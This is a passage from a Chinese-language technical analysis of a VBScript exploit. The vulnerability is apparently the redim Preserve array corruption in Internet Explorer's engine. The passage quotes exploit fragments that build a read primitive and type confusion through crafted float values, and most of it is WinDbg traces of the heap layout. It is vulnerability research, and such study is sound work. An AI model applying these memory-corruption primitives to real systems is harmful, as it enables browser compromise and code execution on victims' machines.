      ab(0)=1.69759663316747E-313  '0x0000000800000008'
      ReadMemo=lenb(aa(a1))  'read primitive'
      ab(0)=0
      redim Preserve aa(a0)
    end function
其中，科学记数法表示的浮点数可由C中的printf函数进行转换：
``` code c printf("%I64x\n", 1.69759663316747E-313); printf("%.14E\n",
0x0000000800000008);
    在调试过程中我们可适当插入document.write()来输出那些辅助的信息，同时还可以通过插入MsgBox()来定位相关代码，例如最开始先禁用WinDbg中的所有断点，待弹出窗口后再启用断点，这样我们就能快速跳到想要的位置跟踪调试了。
    此外，[yuange](https://twitter.com/yuange75)的DVE（数据虚拟执行）想法确实妙，笔者还有待慢慢领悟，下面我们进入详细的分析。
    ####1 内存布局
    exploit中用到了aa和ab两个数组，它们会在Over()中通过redim进行重新分配，也就是执行完如下两条语句后：
    ``` code html
    redim Preserve aa(a0)
    redim ab(a0)
内存布局需要达到如下效果，同样，每个数组元素都保存在Variant结构中：
 图2 期望的内存布局
如果不满足就重复这个分配过程，由于相应空间分配在堆上，根据堆管理的性质是能实现上述布局的，这样就可以通过corrupt后的aa数组来越界访问ab数组了。我们来具体看一下：
    0:012> bp OLEAUT32!SafeArrayRedim
    0:012> g
    Breakpoint 0 hit
    eax=0249cb14 ebx=004692e8 ecx=00000000 edx=00000060 esi=01df84d0 edi=01e00900
    eip=7664ec2c esp=0249cb00 ebp=0249cb1c iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    OLEAUT32!SafeArrayRedim:
    7664ec2c 8bff            mov     edi,edi
    0:005> kb 3
    ChildEBP RetAddr  Args to Child              
    0249cafc 6fb158da 004692e8 0249cb14 ffffffff OLEAUT32!SafeArrayRedim
    0249cb1c 6fb15887 00000001 00000001 01df84d0 vbscript!RedimPreserveArray+0x81
    0249cc18 6fb04ff6 0249ce2c c9d653d5 01e008d0 vbscript!CScriptRuntime::RunNoEH+0x1466
    0:005> dd 004692e8 L6
    004692e8  08800001 00000010 00000000 0042e2b8
    004692f8  00000006 00000000
    ......
    0:005> g
    (6b0.f28): Break instruction exception - code 80000003 (first chance)
    eax=7ffd4000 ebx=00000000 ecx=00000000 edx=77b8f125 esi=00000000 edi=00000000
    eip=77b240f0 esp=059dfd94 ebp=059dfdc0 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    ntdll!DbgBreakPoint:
    77b240f0 cc              int     3
    0:010> dd 004692e8 L6
    004692e8  08800001 00000010 00000000 02e66ec8
    004692f8  080000a2 00000000
    0:010> !heap -p -a 02e66ec8
        address 02e66ec8 found in
        _HEAP @ 3c0000
          HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
            02e66ec0 0145 0000  [00]   02e66ec8    00a20 - (busy)
    0:010> ? 02e66ec8+a2*10
    Evaluate expression: 48658664 = 02e678e8
此时地址0x02e678e8处即为8字节的堆指针，内存分布如下：
 图3 满足条件的内存分布
其中，数值1.012345678901234567890123456789保存在ab(0)中，该Variant结构的Type字段为5，而Data
High＋Data
Low字段为0x3ff0329161f20b24。当aa数组corrupt后可以访问到ab数组中的数据，由于这之间恰好隔了8字节的堆指针，所以这两个数组的Type＋Reserved部分就和Data
High＋Data Low部分交错了，因此ab(0)的Data High＋Data
Low部分会被当成aa(a1)的Type＋Reserved部分，即VarType(aa(a1))等于0x0b24。
#### 2 类型混淆
在完成内存的布局后，exploit就可以借助ab数组元素的赋值操作来对corrupt后aa数组元素的Type字段进行更改，从而实现类型的混淆，接下去我们将分析exploit中用到的类型混淆手法以及由此得到的Read
primitive。
来看下Mydata()函数，它会通过如下代码将testaa函数对象指针赋给i：
``` code html On Error Resume Next i=testaa i=null
    接着是与类型混淆有关的那部分代码：
    ``` code html
    redim Preserve aa(a2)  '对aa数组进行corrupt'
    ab(0)=0
    aa(a1)=i
    ab(0)=6.36598737437801E-314  '0x0000000300000003'
    aa(a1+2)=myarray
    ab(2)=1.74088534731324E-310  '0x0000200c0000200c'
    Mydata=aa(a1)
    redim Preserve aa(a0)  '恢复aa数组至corrupt前'
这里面会进行两次类型混淆处理，首先由于变量i的类型为null(0x01)，因此需要将其转成long
integer(0x03)后再返回，该函数对象指针事实上就是CScriptEntryPoint对象的指针。而myarray中则保存着精心构造的SAFEARRAY结构，最初赋给aa(a1+2)时其类型为string(0x08)，需要将其类型改为Variant数组，这在后面获取Write
primitive时会用到。对应的调试过程如下：
    0:005> bl
     0 e 7664ec2c     0001 (0001)  0:**** OLEAUT32!SafeArrayRedim
     1 e 6fb02e64     0001 (0001)  0:**** vbscript!AssignVar
     2 e 6fb11f4c     0001 (0001)  0:**** vbscript!AccessArray
    0:005> g
    Breakpoint 1 hit
    eax=01df84f0 ebx=0249cc70 ecx=0249cc70 edx=00000060 esi=01e00900 edi=00000010
    eip=6fb02e64 esp=0249cb1c ebp=0249cc18 iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
    vbscript!AssignVar:
    6fb02e64 8bff            mov     edi,edi
    0:005> dd esp L4
    0249cb1c  6fb13991 0013ebf0 02e678f8 01df84f0
    0:005> dd 01df84f0 L4
    01df84f0  0000400c 00000000 0013268c 41a00001
    0:005> dd 0013268c L4
    0013268c  00000001 00000080 01df8718 01000f0e
    0:005> ln poi(01df8718)
    (6fb04934)   vbscript!CScriptEntryPoint::`vftable'   |  (6fb1ab54)   vbscript!CEntryPointDispatch::`vftable'
    Exact matches:
        vbscript!CScriptEntryPoint::`vftable' = 
    0:005> g
    Breakpoint 2 hit
    eax=0249cc10 ebx=0249cc70 ecx=0013f274 edx=0000400c esi=01e00910 edi=00000001
    eip=6fb11f4c esp=0249cb18 ebp=0249cc18 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    vbscript!AccessArray:
    6fb11f4c 8bff            mov     edi,edi
    0:005> db 02e678e8 L20
    02e678e8  ef 6a d2 68 6c 4b 02 08-02 00 00 00 00 00 00 00  .j.hlK..........
    02e678f8  01 00 00 00 80 00 00 00-18 87 df 01 0e 0f 00 01  ................
    0:005> g
    Breakpoint 1 hit
    eax=01df84f0 ebx=0249cc70 ecx=0249cc70 edx=00000002 esi=01e00910 edi=00000010
    eip=6fb02e64 esp=0249cb1c ebp=0249cc18 iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
    vbscript!AssignVar:
    6fb02e64 8bff            mov     edi,edi
    0:005> dd esp L4
    0249cb1c  6fb13991 0013ebf0 02e678f0 01df84f0
    0:005> db 02e678f0 L10
    02e678f0  02 00 00 00 00 00 00 00-01 00 00 00 80 00 00 00  ................
    0:005> db 01df84f0 L10
    01df84f0  05 00 00 00 00 00 00 00-03 00 00 00 03 00 00 00  ................
    0:005> g
    Breakpoint 2 hit
    eax=0249cc10 ebx=0249cc70 ecx=0013f23c edx=0000400c esi=01e00900 edi=00000001
    eip=6fb11f4c esp=0249cb18 ebp=0249cc18 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    vbscript!AccessArray:
    6fb11f4c 8bff            mov     edi,edi
    0:005> db 02e678e8 L20
    02e678e8  ef 6a d2 68 6c 4b 02 08-05 00 00 00 00 00 00 00  .j.hlK..........
    02e678f8  03 00 00 00 03 00 00 00-18 87 df 01 0e 0f 00 01  ................
    0:005> g
    Breakpoint 1 hit
    eax=01df84f0 ebx=0249cc70 ecx=0249cc70 edx=00000060 esi=01e00900 edi=00000010
    eip=6fb02e64 esp=0249cb1c ebp=0249cc18 iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
    vbscript!AssignVar:
    6fb02e64 8bff            mov     edi,edi
    0:005> g
    Breakpoint 2 hit
    eax=0249cc10 ebx=0249cc70 ecx=0013f274 edx=0000400c esi=01e00910 edi=00000001
    eip=6fb11f4c esp=0249cb18 ebp=0249cc18 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    vbscript!AccessArray:
    6fb11f4c 8bff            mov     edi,edi
    0:005> db 02e678e8 L40
    02e678e8  ef 6a d2 68 6c 4b 02 08-05 00 00 00 00 00 00 00  .j.hlK..........
    02e678f8  03 00 00 00 03 00 00 00-18 87 df 01 0e 0f 00 01  ................